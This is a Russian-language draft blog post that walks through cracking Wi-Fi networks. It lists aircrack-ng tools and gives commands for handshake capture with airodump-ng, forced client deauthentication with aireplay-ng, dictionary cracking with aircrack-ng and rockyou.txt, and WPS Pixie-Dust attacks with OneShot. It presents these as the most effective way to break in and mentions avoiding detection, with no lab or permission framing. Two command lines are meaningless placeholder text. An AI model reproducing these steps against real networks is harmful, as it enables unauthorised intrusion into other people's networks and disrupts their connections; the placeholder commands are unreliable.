---
title: "Wi FI_ATTACKING"
date: 2020-01-30T23:36:41+02:00
draft: true
description:
tags:
  - mikrotik
  - solving
---

# Взлом вай фай - самый простой и эффективный способ

Статья будет делится на две отдельные темы

Необходимо выполнить два условия

- Поймать  hendshake
- Расшифровать
- Уязвимости в WPS

Существует разные инструменты для выполненея каждой из эти задач, поговорим о них далее.



Если исключить совсем старые точки доступа, детские пароли () и проникновение через уязвимость в WPS (на данный момент у меня нет результата). То остновимся на ловле рукопожатий между роутером и его клиентами. Этот метод наиболее результативный но есть нюанс. Дело в том, что словить хендшейк с первой же попытки невозможен, нужно что бы клиент отключился от роутера и подключился обратно хотя бы 4 раза (если у нас плохой сигнал то ловить придетися итого дольше). Существует способы насильно deauth устройство от роутера, но тогда могут обнаружить наше вмешательство. Если же просто сидеть и ждать естественных перепадключений это может достаточно долгое время, все зависит от случая.

Я приведу список утилит которые нам понадобятся



```
**Required:**

* `python`: Wifite is compatible with both `python2` and `python3`.
* [`iwconfig`](https://wiki.debian.org/iwconfig): For identifying wireless devices already in Monitor Mode.
* [`ifconfig`](https://en.wikipedia.org/wiki/Ifconfig): For starting/stopping wireless devices.
* [`Aircrack-ng`](http://aircrack-ng.org/) suite, includes:
   * [`airmon-ng`](https://tools.kali.org/wireless-attacks/airmon-ng): For enumerating and enabling Monitor Mode on wireless devices.
   * [`aircrack-ng`](https://tools.kali.org/wireless-attacks/aircrack-ng): For cracking WEP .cap files and WPA handshake captures.
   * [`aireplay-ng`](https://tools.kali.org/wireless-attacks/aireplay-ng): For deauthing access points, replaying capture files, various WEP attacks.
   * [`airodump-ng`](https://tools.kali.org/wireless-attacks/airodump-ng): For target scanning & capture file generation.
   * [`packetforge-ng`](https://tools.kali.org/wireless-attacks/packetforge-ng): For forging capture files.

**Optional, but Recommended:**

* [`tshark`](https://www.wireshark.org/docs/man-pages/tshark.html): For detecting WPS networks and inspecting handshake capture files.
* [`reaver`](https://github.com/t6x/reaver-wps-fork-t6x): For WPS Pixie-Dust & brute-force attacks.
   * Note: Reaver's `wash` tool can be used to detect WPS networks if `tshark` is not found.
* [`bully`](https://github.com/aanarchyy/bully): For WPS Pixie-Dust & brute-force attacks.
   * Alternative to Reaver. Specify `--bully` to use Bully instead of Reaver.
   * Bully is also used to fetch PSK if `reaver` cannot after cracking WPS PIN.
* [`coWPAtty`](https://tools.kali.org/wireless-attacks/cowpatty): For detecting handshake captures.
* [`pyrit`](https://github.com/JPaulMora/Pyrit): For detecting handshake captures.
* [`hashcat`](https://hashcat.net/): For cracking PMKID hashes.
   * [`hcxdumptool`](https://github.com/ZerBea/hcxdumptool): For capturing PMKID hashes.
   * [`hcxpcaptool`](https://github.com/ZerBea/hcxtools): For converting PMKID packet captures into `hashcat`'s format.
```

Необходимо так же иметь wi-fi адаптер поддерживающий мониторый режим работы для  перехвата хендшейка

Переведем  наш вай фай адаптер в мониторый режим:

`команда бла блапппппппппппппппппппппппппппп`

Это изменить название нашего адаптера и добавить в нему приставку mon

`dsgsdfgdfgdfgdfg`

Далее нужно разузнать о том кто находится в сети, можно через утилиту airodump-ng которая является частью Aircrack-ng, или же получить более интересный интерфейс через утилиту kismet



airodump-ng wlp3s0mon

Выбираем нужную нам сеть (ориентируемся на pwr, со слабым сигналом шанс на успех ловли хендшейка маловероятен)

airodump-ng wlp3s0mon --channel 1 -w cap2

И стартуем запись на соотвествуещем канале нужный нам BSSID

В случае, если продолжительное время хендшейк не ловится, можно сделать deauth

Данной командой

`aireplay-ng -0 5 -a 20:25:64:16:58:8C wlp3s0mon

Этой командой мы отключим клиентов от роутера (если они вообще подключены)

где  `20:25:64:16:58:8C` MAC - соотв сети которую мы мониторим



В случае успеха мы получим cap2 файл, который можно попробовать взломать с помощью :

`aircrack-ng -w rockyou.txt handshake.cap`  

И результат спустя 2 минуты ожидания

[скачать словарь rockyou.txt](https://www.scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt)



Проникновение через WPS с помощью **[Pixiewps](https://github.com/wiire-a/pixiewps)**

Существует простая и удобная утилита для работы с этой программой [OneShot](https://github.com/drygdryg/OneShot)

В зависимостях которой python3, wpa supplicant и соотвественно **[Pixiewps](https://github.com/wiire-a/pixiewps)**

Скачиваем скрипт и сканируем сеть:

```
sudo python3 oneshot.py -i wlp3s0mon -b 00:90:4C:C1:AC:21 -K
```

Где 00:90:4C:C1:AC:21 - MAC выбранной нами сети.

Спустя мгновение мы получаем пароль. 

